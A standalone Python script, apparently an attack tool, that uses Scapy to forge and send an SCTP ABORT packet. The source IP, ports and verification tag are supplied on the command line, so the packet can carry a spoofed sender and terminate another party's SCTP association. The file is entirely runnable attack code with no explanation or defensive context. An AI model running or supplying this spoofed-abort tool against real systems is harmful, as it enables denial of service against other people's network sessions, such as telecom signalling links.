import argparse
from scapy.all import *
from scapy.layers.sctp import SCTPChunkAbort

def forge_sctp_packet(src_ip, dst_ip, src_port, dst_port, payload, vtag):
    ip = IP(src=src_ip, dst=dst_ip)
    sctp = SCTPChunkAbort(type=6, reserved=None, TCB=0, len=None, error_causes=b'')
    packet = ip / SCTP(sport=src_port, dport=dst_port, tag=vtag) / sctp
    return packet

def main():
    parser = argparse.ArgumentParser(description='Forge and send an SCTP packet')
    parser.add_argument('-s', '--source', help='Source IP address')
    parser.add_argument('-d', '--destination', help='Destination IP address')
    parser.add_argument('-sp', '--srcport', type=int, help='Source port')
    parser.add_argument('-dp', '--dstport', type=int, help='Destination port')
    parser.add_argument('-t', '--tag', type=lambda x: int(x, 0), help='Verification tag')

    args = parser.parse_args()

    if not args.source or not args.destination or not args.srcport or not args.dstport or not args.tag:
        parser.print_help()
        return

    packet = forge_sctp_packet(args.source, args.destination, args.srcport, args.dstport, "", args.tag)
    send(packet)

if __name__ == '__main__':
    main()
